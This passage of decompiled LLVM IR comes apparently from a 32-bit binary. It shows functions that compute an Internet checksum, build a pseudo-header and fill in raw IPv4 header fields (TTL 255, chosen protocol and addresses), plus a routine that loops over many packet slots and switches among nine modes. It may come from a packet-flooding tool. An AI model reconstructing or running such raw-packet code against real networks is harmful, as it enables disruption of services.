  br i1 %v5_8049ce713, label %dec_label_pc_8049cc3.lr.ph, label %dec_label_pc_8049ce9

dec_label_pc_8049cc3.lr.ph:                       ; preds = %dec_label_pc_8049caa
  %v4_8049cc6.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8049cc3

dec_label_pc_8049cc3:                             ; preds = %dec_label_pc_8049cc3.lr.ph, %dec_label_pc_8049cc3
  %v3_8049cd5 = phi i32 [ 0, %dec_label_pc_8049cc3.lr.ph ], [ %v6_8049cd5, %dec_label_pc_8049cc3 ]
  %v4_8049cc6 = phi i32 [ %v4_8049cc6.pre, %dec_label_pc_8049cc3.lr.ph ], [ %v6_8049cc6, %dec_label_pc_8049cc3 ]
  %stack_var_-24.016 = phi i32 [ 0, %dec_label_pc_8049cc3.lr.ph ], [ %v9_8049cd8, %dec_label_pc_8049cc3 ]
  %stack_var_8.015 = phi i32 [ %arg2, %dec_label_pc_8049cc3.lr.ph ], [ %v4_8049cdf, %dec_label_pc_8049cc3 ]
  %stack_var_4.014 = phi i16* [ %arg1, %dec_label_pc_8049cc3.lr.ph ], [ %v23_8049cdb, %dec_label_pc_8049cc3 ]
  %v4_8049cc3 = ptrtoint i16* %stack_var_4.014 to i32
  %v2_8049cc6 = load i16, i16* %stack_var_4.014, align 2
  %v3_8049cc6 = zext i16 %v2_8049cc6 to i32
  %v5_8049cc6 = and i32 %v4_8049cc6, -65536
  %v6_8049cc6 = or i32 %v3_8049cc6, %v5_8049cc6
  store i32 %v6_8049cc6, i32* @ecx, align 4
  %sext29 = mul i32 %v3_8049cd5, 65536
  %v4_8049cd5 = sdiv i32 %sext29, 65536
  %v6_8049cd5 = add nsw i32 %v3_8049cc6, %v4_8049cd5
  %v11_8049cd5 = icmp ult i32 %v6_8049cd5, %v4_8049cd5
  %sext = mul i32 %stack_var_-24.016, 65536
  %v4_8049cd8 = sdiv i32 %sext, 65536
  %v7_8049cd8 = zext i1 %v11_8049cd5 to i32
  %v9_8049cd8 = add nsw i32 %v7_8049cd8, %v4_8049cd8
  %v5_8049cdb = add i32 %v4_8049cc3, 2
  %v23_8049cdb = inttoptr i32 %v5_8049cdb to i16*
  %v4_8049cdf = add i32 %stack_var_8.015, -2
  %v4_8049ce3 = add i32 %stack_var_8.015, -3
  %v9_8049ce3 = sub i32 2, %stack_var_8.015
  %v10_8049ce3 = and i32 %v4_8049cdf, %v9_8049ce3
  %v11_8049ce3 = icmp slt i32 %v10_8049ce3, 0
  %v12_8049ce3 = icmp eq i32 %v4_8049ce3, 0
  %v13_8049ce3 = icmp slt i32 %v4_8049ce3, 0
  %v3_8049ce7 = icmp eq i1 %v13_8049ce3, %v11_8049ce3
  %v4_8049ce7 = icmp eq i1 %v12_8049ce3, false
  %v5_8049ce7 = and i1 %v4_8049ce7, %v3_8049ce7
  br i1 %v5_8049ce7, label %dec_label_pc_8049cc3, label %dec_label_pc_8049ce3.dec_label_pc_8049ce9_crit_edge

dec_label_pc_8049ce3.dec_label_pc_8049ce9_crit_edge: ; preds = %dec_label_pc_8049cc3
  %v26_8049cd5 = trunc i32 %v6_8049cd5 to i16
  %v35_8049cd8 = trunc i32 %v9_8049cd8 to i16
  br label %dec_label_pc_8049ce9

dec_label_pc_8049ce9:                             ; preds = %dec_label_pc_8049ce3.dec_label_pc_8049ce9_crit_edge, %dec_label_pc_8049caa
  %v3_8049d00 = phi i16 [ %v26_8049cd5, %dec_label_pc_8049ce3.dec_label_pc_8049ce9_crit_edge ], [ 0, %dec_label_pc_8049caa ]
  %stack_var_4.0.lcssa = phi i16* [ %v23_8049cdb, %dec_label_pc_8049ce3.dec_label_pc_8049ce9_crit_edge ], [ %arg1, %dec_label_pc_8049caa ]
  %stack_var_8.0.lcssa = phi i32 [ %v4_8049cdf, %dec_label_pc_8049ce3.dec_label_pc_8049ce9_crit_edge ], [ %arg2, %dec_label_pc_8049caa ]
  %stack_var_-24.0.lcssa = phi i16 [ %v35_8049cd8, %dec_label_pc_8049ce3.dec_label_pc_8049ce9_crit_edge ], [ 0, %dec_label_pc_8049caa ]
  %tmp38 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp38, label %dec_label_pc_8049d2d.preheader, label %dec_label_pc_8049cef

dec_label_pc_8049cef:                             ; preds = %dec_label_pc_8049ce9
  %v1_8049cf2 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_8049cf2 = load i8, i8* %v1_8049cf2, align 1
  %v3_8049cf2 = zext i8 %v2_8049cf2 to i32
  %v4_8049d00 = sext i16 %v3_8049d00 to i32
  %v6_8049d00 = add nsw i32 %v3_8049cf2, %v4_8049d00
  %v11_8049d00 = icmp ult i32 %v6_8049d00, %v4_8049d00
  %v26_8049d00 = trunc i32 %v6_8049d00 to i16
  %v7_8049d03 = zext i1 %v11_8049d00 to i16
  %v9_8049d03 = add i16 %v7_8049d03, %stack_var_-24.0.lcssa
  br label %dec_label_pc_8049d2d.preheader

dec_label_pc_8049d2d.preheader:                   ; preds = %dec_label_pc_8049cef, %dec_label_pc_8049ce9
  %v3_8049d12.ph = phi i16 [ %v3_8049d00, %dec_label_pc_8049ce9 ], [ %v26_8049d00, %dec_label_pc_8049cef ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_8049ce9 ], [ %v9_8049d03, %dec_label_pc_8049cef ]
  %v4_8049d2d41 = sext i16 %v3_8049d12.ph to i32
  %v4_8049d3042 = sext i16 %stack_var_-24.1.ph to i32
  %v3_8049d3343 = udiv i32 %v4_8049d2d41, 65536
  %v4_8049d3344 = mul i32 %v4_8049d3042, 65536
  %v5_8049d3345 = or i32 %v4_8049d3344, %v3_8049d3343
  %v2_8049d3746 = udiv i32 %v4_8049d3042, 65536
  %v2_8049d3a47 = or i32 %v5_8049d3345, %v2_8049d3746
  %v3_8049d3a48 = icmp eq i32 %v2_8049d3a47, 0
  %v1_8049d3e49 = icmp eq i1 %v3_8049d3a48, false
  br i1 %v1_8049d3e49, label %dec_label_pc_8049d08, label %dec_label_pc_8049d40

dec_label_pc_8049d08:                             ; preds = %dec_label_pc_8049d2d.preheader, %dec_label_pc_8049d08
  %v2_8049d3752 = phi i32 [ %v2_8049d37, %dec_label_pc_8049d08 ], [ %v2_8049d3746, %dec_label_pc_8049d2d.preheader ]
  %v5_8049d3351 = phi i32 [ %v5_8049d33, %dec_label_pc_8049d08 ], [ %v5_8049d3345, %dec_label_pc_8049d2d.preheader ]
  %v4_8049d2d50 = phi i32 [ %v4_8049d2d, %dec_label_pc_8049d08 ], [ %v4_8049d2d41, %dec_label_pc_8049d2d.preheader ]
  %v2_8049d23 = add i32 %v5_8049d3351, %v4_8049d2d50
  %v7_8049d23 = icmp ult i32 %v2_8049d23, %v4_8049d2d50
  %v3_8049d25 = zext i1 %v7_8049d23 to i32
  %v5_8049d25 = add nuw nsw i32 %v3_8049d25, %v2_8049d3752
  %sext54 = mul i32 %v2_8049d23, 65536
  %v4_8049d2d = sdiv i32 %sext54, 65536
  %sext55 = mul i32 %v5_8049d25, 65536
  %v4_8049d30 = sdiv i32 %sext55, 65536
  %v3_8049d33 = udiv i32 %v4_8049d2d, 65536
  %v5_8049d33 = or i32 %sext55, %v3_8049d33
  %v2_8049d37 = udiv i32 %v4_8049d30, 65536
  %v2_8049d3a = or i32 %v5_8049d33, %v2_8049d37
  %v3_8049d3a = icmp eq i32 %v2_8049d3a, 0
  %v1_8049d3e = icmp eq i1 %v3_8049d3a, false
  br i1 %v1_8049d3e, label %dec_label_pc_8049d08, label %dec_label_pc_8049d2d.dec_label_pc_8049d40_crit_edge

dec_label_pc_8049d2d.dec_label_pc_8049d40_crit_edge: ; preds = %dec_label_pc_8049d08
  br label %dec_label_pc_8049d40

dec_label_pc_8049d40:                             ; preds = %dec_label_pc_8049d2d.dec_label_pc_8049d40_crit_edge, %dec_label_pc_8049d2d.preheader
  %v4_8049d2d.lcssa = phi i32 [ %v4_8049d2d, %dec_label_pc_8049d2d.dec_label_pc_8049d40_crit_edge ], [ %v4_8049d2d41, %dec_label_pc_8049d2d.preheader ]
  %v1_8049d43 = urem i32 %v4_8049d2d.lcssa, 65536
  %v1_8049d45 = xor i32 %v1_8049d43, 65535
  ret i32 %v1_8049d45

; uselistorder directives
  uselistorder i32 %v5_8049d33, { 1, 0 }
  uselistorder i32 %v4_8049d2d, { 1, 0, 2 }
  uselistorder i32 %v2_8049d3746, { 1, 0 }
  uselistorder i32 %v4_8049d3042, { 1, 0 }
  uselistorder i32 %v4_8049d2d41, { 2, 1, 0 }
  uselistorder i32 %v4_8049d00, { 1, 0 }
  uselistorder i32 %v4_8049ce3, { 1, 0 }
  uselistorder i32 %v6_8049cd5, { 1, 2, 0 }
  uselistorder i32 %v6_8049cc6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049d08, { 1, 0 }
  uselistorder label %dec_label_pc_8049cc3, { 1, 0 }
}

define i32 @function_8049d52(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8049d52:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg2 to i32
  %v1_8049d66 = add i32 %arg1, 12
  %v2_8049d66 = inttoptr i32 %v1_8049d66 to i32*
  %v3_8049d66 = load i32, i32* %v2_8049d66, align 4
  %v1_8049d6f = add i32 %arg1, 16
  %v2_8049d6f = inttoptr i32 %v1_8049d6f to i32*
  %v3_8049d6f = load i32, i32* %v2_8049d6f, align 4
  %v1_8049d82 = call i32 @function_804f4d0(i32 20)
  %v1_8049d9c = call i32 @function_804f8ae(i32 32)
  store i32 %v1_8049d9c, i32* %ecx.global-to-local, align 4
  %v2_8049daf = inttoptr i32 %v1_8049d9c to i32*
  store i32 %v3_8049d66, i32* %v2_8049daf, align 4
  %v1_8049db4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049db4 = add i32 %v1_8049db4, 4
  %v3_8049db4 = inttoptr i32 %v2_8049db4 to i32*
  store i32 %v3_8049d6f, i32* %v3_8049db4, align 4
  %v1_8049dba = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049dba = add i32 %v1_8049dba, 8
  %v3_8049dba = inttoptr i32 %v2_8049dba to i32*
  store i32 0, i32* %v3_8049dba, align 4
  store i32 %tmp2, i32* @ecx, align 4
  %v1_8049dc3 = add i32 %v1_8049d9c, 12
  store i32 %v1_8049dc3, i32* %edx.global-to-local, align 4
  %v2_8049dc6 = load i32, i32* %arg2, align 4
  %v2_8049dc8 = inttoptr i32 %v1_8049dc3 to i32*
  store i32 %v2_8049dc6, i32* %v2_8049dc8, align 4
  %v0_8049dca = load i32, i32* @ecx, align 4
  %v1_8049dca = add i32 %v0_8049dca, 4
  %v2_8049dca = inttoptr i32 %v1_8049dca to i32*
  %v3_8049dca = load i32, i32* %v2_8049dca, align 4
  %v1_8049dcd = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dcd = add i32 %v1_8049dcd, 4
  %v3_8049dcd = inttoptr i32 %v2_8049dcd to i32*
  store i32 %v3_8049dca, i32* %v3_8049dcd, align 4
  %v0_8049dd0 = load i32, i32* @ecx, align 4
  %v1_8049dd0 = add i32 %v0_8049dd0, 8
  %v2_8049dd0 = inttoptr i32 %v1_8049dd0 to i32*
  %v3_8049dd0 = load i32, i32* %v2_8049dd0, align 4
  %v1_8049dd3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dd3 = add i32 %v1_8049dd3, 8
  %v3_8049dd3 = inttoptr i32 %v2_8049dd3 to i32*
  store i32 %v3_8049dd0, i32* %v3_8049dd3, align 4
  %v0_8049dd6 = load i32, i32* @ecx, align 4
  %v1_8049dd6 = add i32 %v0_8049dd6, 12
  %v2_8049dd6 = inttoptr i32 %v1_8049dd6 to i32*
  %v3_8049dd6 = load i32, i32* %v2_8049dd6, align 4
  %v1_8049dd9 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dd9 = add i32 %v1_8049dd9, 12
  %v3_8049dd9 = inttoptr i32 %v2_8049dd9 to i32*
  store i32 %v3_8049dd6, i32* %v3_8049dd9, align 4
  %v0_8049ddc = load i32, i32* @ecx, align 4
  %v1_8049ddc = add i32 %v0_8049ddc, 16
  %v2_8049ddc = inttoptr i32 %v1_8049ddc to i32*
  %v3_8049ddc = load i32, i32* %v2_8049ddc, align 4
  %v1_8049ddf = load i32, i32* %edx.global-to-local, align 4
  %v2_8049ddf = add i32 %v1_8049ddf, 16
  %v3_8049ddf = inttoptr i32 %v2_8049ddf to i32*
  store i32 %v3_8049ddc, i32* %v3_8049ddf, align 4
  %v2_8049de8 = inttoptr i32 %v1_8049d9c to i16*
  %v3_8049de8 = call i32 @function_8049caa(i16* %v2_8049de8, i32 32)
  %v1_8049dfa = call i32 @function_8050259(i32 %v1_8049d9c)
  %v4_8049e02 = urem i32 %v3_8049de8, 65536
  ret i32 %v4_8049e02

; uselistorder directives
  uselistorder i32 %v1_8049d9c, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_8049e0d(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8049e0d:
  %tmp10 = trunc i32 %arg4 to i8
  %sext2 = mul i32 %arg4, 16777216
  %v4_8049e13 = sdiv i32 %sext2, 16777216
  %v4_8049e19 = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_8049e36 = add i32 %v4_8049e19, 1
  %v2_8049e36 = inttoptr i32 %v1_8049e36 to i8*
  store i8 0, i8* %v2_8049e36, align 1
  %v1_8049e3d = add i32 %arg5, 20
  %v1_8049e43 = trunc i32 %v1_8049e3d to i16
  %v3_8049e43 = add i32 %v4_8049e19, 2
  %v4_8049e43 = inttoptr i32 %v3_8049e43 to i16*
  store i16 %v1_8049e43, i16* %v4_8049e43, align 2
  %v2_8049e47 = call i32 @function_8048298(i32 %v4_8049e13)
  %v1_8049e51 = trunc i32 %v2_8049e47 to i16
  %v3_8049e51 = add i32 %v4_8049e19, 4
  %v4_8049e51 = inttoptr i32 %v3_8049e51 to i16*
  store i16 %v1_8049e51, i16* %v4_8049e51, align 2
  %v1_8049e58 = add i32 %v4_8049e19, 6
  %v2_8049e58 = inttoptr i32 %v1_8049e58 to i16*
  store i16 0, i16* %v2_8049e58, align 2
  %v1_8049e61 = add i32 %v4_8049e19, 8
  %v2_8049e61 = inttoptr i32 %v1_8049e61 to i8*
  store i8 -1, i8* %v2_8049e61, align 1
  %v3_8049e6b = add i32 %v4_8049e19, 9
  %v4_8049e6b = inttoptr i32 %v3_8049e6b to i8*
  store i8 %tmp10, i8* %v4_8049e6b, align 1
  %v1_8049e71 = add i32 %v4_8049e19, 10
  %v2_8049e71 = inttoptr i32 %v1_8049e71 to i16*
  store i16 0, i16* %v2_8049e71, align 2
  %v2_8049e7d = add i32 %v4_8049e19, 12
  %v3_8049e7d = inttoptr i32 %v2_8049e7d to i32*
  store i32 %arg3, i32* %v3_8049e7d, align 4
  %v2_8049e86 = add i32 %v4_8049e19, 16
  %v3_8049e86 = inttoptr i32 %v2_8049e86 to i32*
  store i32 %arg2, i32* %v3_8049e86, align 4
  ret i32 %arg2

; uselistorder directives
  uselistorder i8 -1, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_8048298, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_8049e8b(i32 %arg1) local_unnamed_addr {
dec_label_pc_8049e8b:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e8b = load i32, i32* @ebp, align 4
  store i32 %v0_8049e8b, i32* %stack_var_-4, align 4
  %v4_8049e91 = add i32 %arg1, -2
  %v9_8049e91 = sub i32 1, %arg1
  %v10_8049e91 = and i32 %v9_8049e91, %arg1
  %v11_8049e91 = icmp slt i32 %v10_8049e91, 0
  %v12_8049e91 = icmp eq i32 %v4_8049e91, 0
  %v13_8049e91 = icmp slt i32 %v4_8049e91, 0
  %v3_8049e95 = icmp eq i1 %v13_8049e91, %v11_8049e91
  %v4_8049e95 = icmp eq i1 %v12_8049e91, false
  %v5_8049e95 = and i1 %v4_8049e95, %v3_8049e95
  br i1 %v5_8049e95, label %dec_label_pc_8049ea0, label %dec_label_pc_8049eb5

dec_label_pc_8049ea0:                             ; preds = %dec_label_pc_8049e8b
  %v1_8049ea6 = call i32 @function_804de24(i32 %arg1)
  %v2_8049eb8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049eb5

dec_label_pc_8049eb5:                             ; preds = %dec_label_pc_8049e8b, %dec_label_pc_8049ea0
  %v2_8049eb8 = phi i32 [ %v2_8049eb8.pre, %dec_label_pc_8049ea0 ], [ %v0_8049e8b, %dec_label_pc_8049e8b ]
  %storemerge = phi i32 [ 0, %dec_label_pc_8049ea0 ], [ 1, %dec_label_pc_8049e8b ]
  store i32 %v2_8049eb8, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049e91, { 1, 0 }
  uselistorder i32 (i32)* @function_804de24, { 12, 11, 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049eb5, { 1, 0 }
}

define i32 @function_8049eba() local_unnamed_addr {
dec_label_pc_8049eba:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp53 = call i8* @__decompiler_undefined_function_1()
  %tmp54 = call i8* @__decompiler_undefined_function_1()
  %tmp55 = call i8* @__decompiler_undefined_function_1()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i32 @__decompiler_undefined_function_0()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v0_8049ebd = load i32, i32* @edi, align 4
  %v0_8049ebe = load i32, i32* @esi, align 4
  %v0_8049ebf = load i32, i32* @ebx, align 4
  %v15_8049ec0 = ptrtoint i32* %stack_var_-268 to i32
  %v3_8049ec6 = call i32 @function_804deb0(i32 %v0_8049ebf, i32 %v0_8049ebe, i32 %v0_8049ebd)
  %v2_8049ecf = ashr i32 %v3_8049ec6, 31
  %v2_8049ed2 = udiv i32 %v2_8049ecf, 1073741824
  %v2_8049ed5 = add i32 %v2_8049ed2, %v3_8049ec6
  %v2_8049ed7 = sdiv i32 %v2_8049ed5, 4
  %v2_8049ee0 = mul nsw i32 %v2_8049ed7, 3
  store i32 %v2_8049ee0, i32* %eax.global-to-local, align 4
  %v7_8049ef8 = icmp sgt i32 %v2_8049ee0, 512
  %.v2_8049ee0 = select i1 %v7_8049ef8, i32 512, i32 %v2_8049ee0
  store i32 %.v2_8049ee0, i32* %edx.global-to-local, align 4
  store i32 2, i32* %stack_var_-204, align 4
  %v1_8049f1b = call i32 @function_804f4d0(i32 23)
  %v2_8049f2a = ptrtoint i32* %stack_var_-204 to i32
  %v2_8049f4b = mul i32 %.v2_8049ee0, 24
  %v1_8049f51 = add i32 %v2_8049f4b, 30
  %v2_8049f54 = and i32 %v1_8049f51, -16
  %v2_8049f5a = sub i32 %v15_8049ec0, %v2_8049f54
  %v1_8049f68 = add i32 %v2_8049f5a, 15
  %v2_8049f6b = and i32 %v1_8049f68, -16
  %v2_8049f88 = mul i32 %.v2_8049ee0, 5
  store i32 %v2_8049f88, i32* %edx.global-to-local, align 4
  %v1_8049f8e = inttoptr i32 %v2_8049f6b to i8*
  store i32 %v2_8049f6b, i32* @edi, align 4
  %v1_8049f93 = and i32 %v1_8049f68, -256
  store i32 %v1_8049f93, i32* %eax.global-to-local, align 4
  %v5_8049f95 = call i8* @_memset(i8* %v1_8049f8e, i32 %v1_8049f93, i32 %v2_8049f88)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a01147 = icmp sgt i32 %v2_8049ed5, 3
  %v2_8049faf = or i32 %v2_8049f6b, 9
  br i1 %v5_804a01147, label %dec_label_pc_8049fa0.preheader, label %dec_label_pc_804a013.preheader

dec_label_pc_8049fa0.preheader:                   ; preds = %dec_label_pc_8049eba
  %v2_8049fd5 = add i32 %v2_8049f6b, 20
  br label %dec_label_pc_8049fa0

dec_label_pc_8049fa0:                             ; preds = %dec_label_pc_8049fa0.preheader, %dec_label_pc_8049fa0
  %storemerge548 = phi i32 [ %v4_804a008, %dec_label_pc_8049fa0 ], [ 0, %dec_label_pc_8049fa0.preheader ]
  store i32 %storemerge548, i32* %edx.global-to-local, align 4
  %v2_8049fac = mul nuw nsw i32 %storemerge548, 24
  store i32 %v2_8049fac, i32* %eax.global-to-local, align 4
  %v3_8049faf = add i32 %v2_8049faf, %v2_8049fac
  %v4_8049faf = inttoptr i32 %v3_8049faf to i8*
  store i8 1, i8* %v4_8049faf, align 1
  store i32 %storemerge548, i32* @ebx, align 4
  %v0_8049fb7 = load i32, i32* @esp, align 4
  %v1_8049fba = add i32 %v0_8049fb7, -16
  %v2_8049fba = inttoptr i32 %v1_8049fba to i32*
  store i32 1024, i32* %v2_8049fba, align 4
  %v1_8049fbf = call i32 @function_804f8ae(i32 %storemerge548)
  %v0_8049fcc = load i32, i32* @ebx, align 4
  %v2_8049fd2 = mul i32 %v0_8049fcc, 24
  %v1_8049fd7 = add i32 %v2_8049fd5, %v2_8049fd2
  %v2_8049fda = inttoptr i32 %v1_8049fd7 to i32*
  store i32 %v1_8049fbf, i32* %v2_8049fda, align 4
  store i32 %storemerge548, i32* %edx.global-to-local, align 4
  %v1_8049fed = add i32 %v2_8049fd5, %v2_8049fac
  store i32 %v1_8049fed, i32* %eax.global-to-local, align 4
  %v1_8049ff0 = inttoptr i32 %v1_8049fed to i32*
  %v2_8049ff0 = load i32, i32* %v1_8049ff0, align 4
  store i32 %v2_8049ff0, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_8049ff9 = load i32, i32* @esp, align 4
  %v2_8049ffc = add i32 %v0_8049ff9, -8
  %v3_8049ffc = inttoptr i32 %v2_8049ffc to i32*
  store i32 1024, i32* %v3_8049ffc, align 4
  %v1_8049ffd = add i32 %v0_8049ff9, -12
  %v2_8049ffd = inttoptr i32 %v1_8049ffd to i32*
  store i32 0, i32* %v2_8049ffd, align 4
  %v0_8049fff = load i32, i32* %edx.global-to-local, align 4
  %v2_8049fff = add i32 %v0_8049ff9, -16
  %v3_8049fff = inttoptr i32 %v2_8049fff to i32*
  store i32 %v0_8049fff, i32* %v3_8049fff, align 4
  %v3_804a000 = inttoptr i32 %storemerge548 to i8*
  %v4_804a000 = call i32 @function_804f1d8(i8* %v3_804a000, i32 %tmp61, i32 %tmp66)
  %v4_804a008 = add nuw nsw i32 %storemerge548, 1
  store i32 %v4_804a008, i32* %eax.global-to-local, align 4
  %v5_804a011 = icmp slt i32 %v4_804a008, %.v2_8049ee0
  br i1 %v5_804a011, label %dec_label_pc_8049fa0, label %dec_label_pc_804a013.preheader

dec_label_pc_804a013.preheader:                   ; preds = %dec_label_pc_8049eba, %dec_label_pc_8049fa0
  %v2_804a391 = ptrtoint i32* %stack_var_-172 to i32
  %tmp88 = bitcast i32* %stack_var_-172 to i8*
  %v2_804a400 = ptrtoint i32* %stack_var_-180 to i32
  %v2_804a451 = ptrtoint i32* %stack_var_-184 to i32
  %v2_804a458 = ptrtoint i32* %stack_var_-188 to i32
  %v2_804a02e = or i32 %v2_8049f6b, 8
  %v2_804a137 = or i32 %v2_8049f6b, 11
  %.pre = or i32 %v2_8049f6b, 10
  %v2_804a380 = or i32 %v2_8049f6b, 12
  %v2_804a7de = add i32 %v2_8049f6b, 16
  br label %dec_label_pc_804a013.outer

dec_label_pc_804a013.outer:                       ; preds = %dec_label_pc_804b3cf, %dec_label_pc_804a013.preheader
  %stack_var_-252.0.ph = phi i8* [ %tmp53, %dec_label_pc_804a013.preheader ], [ %stack_var_-252.1, %dec_label_pc_804b3cf ]
  %stack_var_-248.0.ph = phi i8* [ %tmp54, %dec_label_pc_804a013.preheader ], [ %stack_var_-248.1, %dec_label_pc_804b3cf ]
  %stack_var_-244.0.ph = phi i8* [ %tmp55, %dec_label_pc_804a013.preheader ], [ %stack_var_-244.1, %dec_label_pc_804b3cf ]
  %stack_var_-240.0.ph = phi i32 [ %tmp56, %dec_label_pc_804a013.preheader ], [ %stack_var_-240.1, %dec_label_pc_804b3cf ]
  %stack_var_-236.0.ph = phi i32 [ %tmp57, %dec_label_pc_804a013.preheader ], [ %stack_var_-236.1, %dec_label_pc_804b3cf ]
  %stack_var_-232.0.ph = phi i32 [ %tmp58, %dec_label_pc_804a013.preheader ], [ %stack_var_-232.1, %dec_label_pc_804b3cf ]
  %stack_var_-228.0.ph = phi i32 [ %tmp59, %dec_label_pc_804a013.preheader ], [ %stack_var_-228.1, %dec_label_pc_804b3cf ]
  %stack_var_-224.0.ph = phi i32 [ %tmp60, %dec_label_pc_804a013.preheader ], [ %stack_var_-224.1, %dec_label_pc_804b3cf ]
  br label %dec_label_pc_804a013

dec_label_pc_804a013:                             ; preds = %dec_label_pc_804a013.outer, %dec_label_pc_804a013
  br i1 %v5_804a01147, label %dec_label_pc_804a01f.preheader, label %dec_label_pc_804a013

dec_label_pc_804a01f.preheader:                   ; preds = %dec_label_pc_804a013
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a01f

dec_label_pc_804a01f:                             ; preds = %dec_label_pc_804a01f.preheader, %dec_label_pc_804b3cf
  %v1_804a145 = phi i32 [ %v4_804b3cf, %dec_label_pc_804b3cf ], [ 0, %dec_label_pc_804a01f.preheader ]
  %stack_var_-224.229 = phi i32 [ %stack_var_-224.1, %dec_label_pc_804b3cf ], [ %stack_var_-224.0.ph, %dec_label_pc_804a01f.preheader ]
  %stack_var_-228.227 = phi i32 [ %stack_var_-228.1, %dec_label_pc_804b3cf ], [ %stack_var_-228.0.ph, %dec_label_pc_804a01f.preheader ]
  %stack_var_-232.225 = phi i32 [ %stack_var_-232.1, %dec_label_pc_804b3cf ], [ %stack_var_-232.0.ph, %dec_label_pc_804a01f.preheader ]
  %stack_var_-236.223 = phi i32 [ %stack_var_-236.1, %dec_label_pc_804b3cf ], [ %stack_var_-236.0.ph, %dec_label_pc_804a01f.preheader ]
  %stack_var_-240.221 = phi i32 [ %stack_var_-240.1, %dec_label_pc_804b3cf ], [ %stack_var_-240.0.ph, %dec_label_pc_804a01f.preheader ]
  %stack_var_-244.219 = phi i8* [ %stack_var_-244.1, %dec_label_pc_804b3cf ], [ %stack_var_-244.0.ph, %dec_label_pc_804a01f.preheader ]
  %stack_var_-248.217 = phi i8* [ %stack_var_-248.1, %dec_label_pc_804b3cf ], [ %stack_var_-248.0.ph, %dec_label_pc_804a01f.preheader ]
  %stack_var_-252.215 = phi i8* [ %stack_var_-252.1, %dec_label_pc_804b3cf ], [ %stack_var_-252.0.ph, %dec_label_pc_804a01f.preheader ]
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v2_804a02b = mul nuw nsw i32 %v1_804a145, 24
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a02e = add i32 %v2_804a02e, %v2_804a02b
  %v4_804a02e = inttoptr i32 %v3_804a02e to i8*
  %v5_804a02e = load i8, i8* %v4_804a02e, align 8
  %v6_804a02e = zext i8 %v5_804a02e to i32
  %v8_804a02e = and i32 %v2_804a02b, -256
  %v9_804a02e = or i32 %v6_804a02e, %v8_804a02e
  store i32 %v9_804a02e, i32* %eax.global-to-local, align 4
  store i32 %v6_804a02e, i32* %edx.global-to-local, align 4
  store i32 %v6_804a02e, i32* @edi, align 4
  %v1_804a052 = mul nuw nsw i32 %v6_804a02e, 4
  %v2_804a052 = add nuw nsw i32 %v1_804a052, 134556076
  %v3_804a052 = inttoptr i32 %v2_804a052 to i32*
  %v4_804a052 = load i32, i32* %v3_804a052, align 4
  store i32 %v4_804a052, i32* %eax.global-to-local, align 4
  switch i8 %v5_804a02e, label %dec_label_pc_804b3cf [
    i8 0, label %dec_label_pc_804a05b
    i8 1, label %dec_label_pc_804a348
    i8 2, label %dec_label_pc_804a646
    i8 3, label %dec_label_pc_804a85f
    i8 4, label %dec_label_pc_804a9ba
    i8 5, label %dec_label_pc_804ac57
    i8 6, label %dec_label_pc_804adb2
    i8 7, label %dec_label_pc_804b0d4
    i8 8, label %dec_label_pc_804b25e
  ]

dec_label_pc_804a05b:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v2_804a06a = add i32 %v2_804a02b, %v2_8049f6b
  %v1_804a06c = add i32 %v2_804a06a, 20
  store i32 %v1_804a06c, i32* %eax.global-to-local, align 4
  %v1_804a06f = inttoptr i32 %v1_804a06c to i32*
  %v2_804a06f = load i32, i32* %v1_804a06f, align 4
  store i32 %v2_804a06f, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804a078 = load i32, i32* @esp, align 4
  %v2_804a07b = add i32 %v0_804a078, -8
  %v3_804a07b = inttoptr i32 %v2_804a07b to i32*
  store i32 1024, i32* %v3_804a07b, align 4
